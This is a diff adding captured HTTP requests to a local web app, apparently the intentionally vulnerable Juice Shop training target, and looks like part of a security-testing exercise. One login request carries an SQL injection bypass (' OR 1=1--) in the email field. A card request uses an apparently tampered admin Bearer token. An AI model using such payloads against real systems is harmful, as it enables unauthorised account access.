@@ -207,3 +207,34 @@
     },
     "post_data": ""
 }
+
+{
+    "url": "http://localhost:3000/api/Cards/",
+    "method": "POST",
+    "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Authorization": "Bearer dsauiduasi8899812HJXSJeyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDEtMTggMjI6MjU6NTIuNzUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDEtMTggMjI6MzQ6MDMuNDE0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTczNzIzOTY2NX0.ItoG_Oq1vei-zbwXPtKpLEwti7-m1A8z3e7dyPtraQ7olMvw1pQH3rxvGT3j7op9sAdo5u9VkP9Shg0TnwBiQA0Xh20i714KxkiolNcZhKn8t9vxQ8kP7S4c5p-QRLE6cmxw5scuvIKq9aeVPQNk8rDaVnm9qKAyDlLGo7wsYrs",
+        "Content-Type": "application/json",
+        "Referer": "http://localhost:3s00/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+    },
+    "post_data": "{\"fullName\":\"dsakndas\",\"cardNum\":8321884372829,\"expMonth\":\"3\",\"expYear\":\"2059\"}"
+}
+
+{
+    "url": "http://localhost:3000/rest/user/login",
+    "method": "POST",
+    "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Referer": "http://localhost:3000/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\""
+    },
+    "post_data": "{\"email\":\"dsandas@gmial.com' OR 1=1--\",\"password\":\"abc12367s8\"}"
+}
